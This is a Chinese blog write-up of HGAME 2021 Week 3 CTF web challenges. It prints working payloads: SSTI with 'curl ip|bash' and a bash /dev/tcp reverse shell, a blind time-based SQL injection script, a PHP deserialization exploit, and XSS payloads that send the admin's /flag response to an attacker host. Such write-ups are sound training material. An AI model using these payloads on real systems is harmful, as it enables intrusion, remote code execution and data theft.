---
title: HGAME 2021 Writeup
date: 2021-02-20
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210228093852.png
description: Vidar team主办的比赛
categories: 
- ctf_writeup
tags:
- XSS
- SQLi
---
## Level - Week3

### Forgetful

考点：简单python-SSTI

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210214230828.png)

题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：

![image-20210214230953251](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210214230954.png)

最为常规的payload：

```
{{[].__class__.__mro__[1].__subclasses__()}}
{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('curl ip|bash').read()}}
```

因为命令执行处有waf，所以可以选择直接弹shell：

```
nc -lvnp 8888
bash -i >& /dev/tcp/ip/8888 0>&1
```

姿势还是比较常规；

分享一个从`[].__class__.__mro__[1].__subclasses__()`查找模块位置的脚本：

```python
#python 3
import re
str = '''
[回显内容]
'''

list = re.split(',', str)

for i in range(0, len(list)):
      if 'catch_warnings' in list[i]:
            print(i)
            break
```



### iki-Jail

考点：MySQL注入，单引号逃逸

熟悉的登录框，熟悉的sql注入

![image-20210215130849132](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210215130850.png)

发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。

于是直接使用bp对`login.php`发包；

进行了简单的fuzz，过滤如下：

![image-20210215131110567](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210215131112.png)

由单双引号过滤想到了`\`逃逸单引号，当我们用户名输入`admin\`的时候，语句变成了：

```sql
SELECT * FROM user WHERE username='admin\' AND password='xxx'
```

那么`xxx`就变成了sql语句执行，造成了注入；

结果发现只能延时注入：

![image-20210215131033385](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210215131035.png)

exp：

```python
#python3,wh1sper
import requests
import time

host = 'https://jailbreak.liki.link/login.php'

def mid(bot, top):
    return (int)(0.5*(top+bot))

def transToHex(flag):
    res = ''
    for i in flag:
        res += hex(ord(i))
    res = '0x' + res.replace('0x', '')
    return res

def sqli():
    name = ''
    for j in range(1, 200):
        top = 126
        bot = 32
        while top > bot:
            babyselect = '(database())'#week3sqli
            babyselect = "(select group_concat(table_name) from information_schema.TABLES where table_schema like database())"#u5ers
            babyselect = "(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)"#usern@me,p@ssword
            babyselect = "(select `p@ssword` from week3sqli.u5ers)"#sOme7hiNgseCretw4sHidd3n
            babyselect = "(select `usern@me` from week3sqli.u5ers)"#admin
            payload = "^(if((ascii(substr({},{},1))>{}),1,sleep(2)))#".format(babyselect, j, mid(bot, top))
            data = {
                "username": "admin\\",
                "password": payload.replace(' ', '/**/')
                #^(if((ascii(1)>55),sleep(3),sleep(3)))#这个确实延时成功了
            }
            try:
                start = time.time()
                r = requests.post(url=host, data=data)
                print(data)
                print(time.time()-start)
                if time.time()-start < 1.5:
                    bot = mid(bot, top) + 1
                else:
                    top = mid(bot, top)
            except:
                continue
        name += chr(top)
        print(name)

if __name__ == '__main__':
    sqli()
    #hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}

```

hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}

### Arknights

考点：PHP反序列化

![image-20210215121933780](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210215121944.png)

题目是一个类似于抽卡的网站，描述里面说"r4u用git部署到了自己的服务器上"，那么自然而然Githack把源码hack下来。

[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip)

在`simulator.php`我们可以看到有很多类，其中第146行

```php
class Eeeeeeevallllllll{
    public $msg="坏坏liki到此一游";

    public function __destruct()
    {
        echo $this->msg;
    }
}
```

有一个echo操作，那么我们全局搜索`__toString`。第93行：

```php
class CardsPool{
    ……
        
    public function __toString(){
        return file_get_contents($this->file);
    }
}
```

pop链很明确，就看如何触发反序列化了。

第137行`Session::extract()`:

```php
public function extract($session){

        $sess_array = explode(".", $session);
        $data = base64_decode($sess_array[0]);
        $sign = base64_decode($sess_array[1]);

        if($sign === md5($data . self::secret_key)){
            $this->sessiondata = unserialize($data);
        }else{
            unset($this->sessiondata);
            die("go away! you hacker!");
        }
```

他会把session的`.`前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了

```php
const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
```

那么我们可以编写一个exp：

```php
<?php
class Eeeeeeevallllllll
{
    public $msg = 'a';

}

class CardsPool
{

    public $cards;
    private $file = 'flag.php';

}

$pop = new Eeeeeeevallllllll();
$pop->msg = new CardsPool();
//echo serialize($pop);
$key = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
$sign = md5(serialize($pop).$key);
$payload = base64_encode(serialize($pop)).'.'.base64_encode($sign);
echo $payload;
/*
$sess_array = explode(".", $payload);
$data = base64_decode($sess_array[0]);
echo $data,"\n";
$sign = base64_decode($sess_array[1]);
echo $sign,"\n";
if($sign === md5($data . $key)){
    unserialize($data);
}else{
    echo $sign;
    die("go away! you hacker!");
}
*/

```

发送session即可得到flag

![image-20210215130722662](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210215130724.png)



### Post to zuckonit2.0

考点：XSS

网站是一个创建笔记的站点，存在XSS漏洞

![image-20210216130624020](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210216130625.png)

在`/static/www.zip`给了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip)

和week2的XSS比起来多一个功能，可以替换批量字符串，并且在`/preview`查看替换的结果

审计源码，在添加留言的存在一个waf：

![image-20210216125152416](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210216125153.png)

跟进函数：

```python
def escape_index(original):
    content = original
    content_iframe = re.sub(r"^(<?/?iframe)\s+.*?(src=[\"'][a-zA-Z/]{1,8}[\"']).*?(>?)$", r"\1 \2 \3", content)#只留src属性
    if content_iframe != content or re.match(r"^(<?/?iframe)\s+(src=[\"'][a-zA-Z/]{1,8}[\"'])$", content):
        return content_iframe
    else:
        content = re.sub(r"<*/?(.*?)>?", r"\1", content)
        return content
```

可以看到只允许我们添加类似于`<iframe scr="xxx">`的标签，并且`xxx`限制在1-8位，显然没办法直接执行JS。

不过我们可以添加`<iframe scr="/preview ">`来使得index能直接看到`/preview`页面：

![image-20210216124754639](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210216124755.png)

再通过字符串替换功能，把`xxx`换成`javascript:xxxxx`，形成`<iframe src='javascript:alter(1)'>`即可XSS

payload：

```js
javascript:document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+'));
```

小手一抖，cookie到手：

![image-20210216124651414](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210216124700.png)

hgame{simple_csp_bypass&a_small_mistake_on_the_replace_function}





### Post to zuckonit another version

考点：XSS，HttpOnly绕过

说是绕`HttpOnly`，实则并没有绕；

相比于上一道XSS：

1. 增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；

   ![image-20210220173619352](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220173620.png)

2. 修改了功能，把直接替换字符串换成了查找字符串

   ![image-20210220173856459](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220173858.png)

依然在`static/www.zip`给出了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip)

源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加`<b>`标签，得到高亮效果

![image-20210220174348492](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220174349.png)

如果按照正常思维来查找'a'字符串的话，效果就如下图：

![image-20210220174510622](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220174512.png)

但是我们应当注意到，这个高亮实际上还是由`String.prototype.replace()`方法来进行**正则替换**的，那么我们如果输入`.*`之类的关键词进行高亮就会出现意想不到的效果：
![image-20210220174752450](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220174753.png)

没错，因为正则替换让我们得以有机可乘

思路还是一样，先利用替换构造好XSS，再利用`<iframe src='/preview'>`来触发0-click

payload：

```
<iframe src='/preview'>
<iframe src='AAA' >
```

替换的payload：

```
AAA('srcdoc='&lt;img src=1 onerror=document.write(atob(&#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&#x27;));&gt;')*
```

替换之后其实是这样：

![image-20210220175913943](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220175915.png)

实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过

```
<iframe src="<b class=&quot;search_result&quot;>AAA(" srcdoc="<img src=1 onerror=document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg=='));>" )*<="" b="">' ></iframe>
```

结果一目了然；

而iframe里面`<script>`指向的JS：

```js
xmlhttp = new XMLHttpRequest();
//是否能跨域
xmlhttp.withCredentials = true;
xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4) {
        location.href = 'http://ip/?cookie=' + btoa(xmlhttp.responseText)
        //得用btoa()进行base64编码，不然flag会很神必
        //尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用
    }
};
//设置连接信息
//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post
//第二个参数表示请求的url地址，get方式请求的参数也在url中
//第三个参数表示采用异步还是同步方式交互，true表示异步
xmlhttp.open('GET', '/flag', true);
//4.发送数据，开始和服务器端进行交互
//同步方式下，send这句话会在服务器段数据回来后才执行完
//异步方式下，send这句话会立即完成执行
xmlhttp.send('');
```

不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求`/flag`，把responseText发给我们就行了；

这个是本地打的结果：

![image-20210220172727362](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220172735.png)

大手一抖，flag到手：

![image-20210220175430475](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220175431.png)

因为flag里面出题人故意放了`&`字符让我们踩坑，打出来的responseText需要base64编码。

![image-20210220172930232](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220175441.png)

下面这个才对。

![image-20210220173313149](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210220175445.png)